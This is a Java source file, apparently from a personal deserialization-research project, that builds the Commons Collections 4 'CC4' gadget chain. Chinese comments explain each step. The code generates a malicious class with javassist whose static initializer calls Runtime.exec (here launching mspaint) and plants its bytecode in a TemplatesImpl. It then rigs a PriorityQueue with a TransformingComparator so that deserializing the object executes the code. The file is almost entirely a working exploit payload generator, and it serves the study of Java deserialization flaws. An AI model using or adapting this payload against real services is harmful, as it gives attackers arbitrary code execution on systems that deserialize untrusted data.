package com.pinger.javasec.ysoserial;

import com.pinger.javasec.util.SerialUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @author : p1n93r
 * @date : 2021/4/1 21:54
 * CC4 Gadget研究
 * 和CC2一样，就是将CC2中的InvokerTransformer换成ChainedTransformer
 */
public class CC4 {


    public static Object getPayload() throws Exception{
        String abstractTransletClassPath = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";

        // 使用javassist生成一个恶意的类
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(CC2.Placeholder.class));
        classPool.insertClassPath(new ClassClassPath(Class.forName(abstractTransletClassPath)));

        CtClass placeholder = classPool.get(CC2.Placeholder.class.getName());
        placeholder.setSuperclass(classPool.get(Class.forName(abstractTransletClassPath).getName()));
        // 这里insertBefore还是After都一样，反正都是在静态初始化块里写代码
        placeholder.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\"mspaint\");");
        placeholder.setName("EvalClass");
        // 得到恶意类的字节码
        byte[] evalByte = placeholder.toBytecode();

        TemplatesImpl templates = TemplatesImpl.class.getConstructor(new Class[0]).newInstance();
        Class<? extends TemplatesImpl> clazz = templates.getClass();
        // 将恶意字节码填充到TemplatesImpl对象中
        Field bytecodes = clazz.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates,new byte[][]{evalByte});

        // 还需要设置TemplatesImpl对象的_name属性，否则不能顺利执行：TemplatesImpl#getTransletInstance()
        Field name = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"p1n93r");

        // 现在TemplatesImpl准备好了，需要一个类反序列化时触发：TemplatesImpl#newTransformer
        // 使用PriorityQueue类反序列化触发
        PriorityQueue<Object> res = new PriorityQueue<>(2);
        // 为啥不在这个地方添加TemplatesImpl对象：因为add操作会触发比较，而TemplatesImpl没有实现Comparable接口
        // 所以只能后面用反射进行添加了
        res.add(1);
        res.add(1);

        // 现在将TransformingComparator和TemplatesImpl对象设置到PriorityQueue中，
        // 使得PriorityQueue反序列化时调用TransformingComparator#tranformer(chainedTransformer)，从而触发整个利用链
        Class<? extends PriorityQueue> resClazz = res.getClass();

        // 就是将CC2中的InvokerTransformer换成ChainedTransformer
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });

        // 设置PriorityQueue的comparator
        Field comparator = resClazz.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(res,new TransformingComparator(chainedTransformer));

        // 此时和CC2不同的是，不需要在PriorityQueue中添加TemplatesImpl对象了

        return res;
    }

    public static void main(String[] args)throws Exception {
        Object payload = getPayload();
        SerialUtil.runPayload(payload);
    }
}
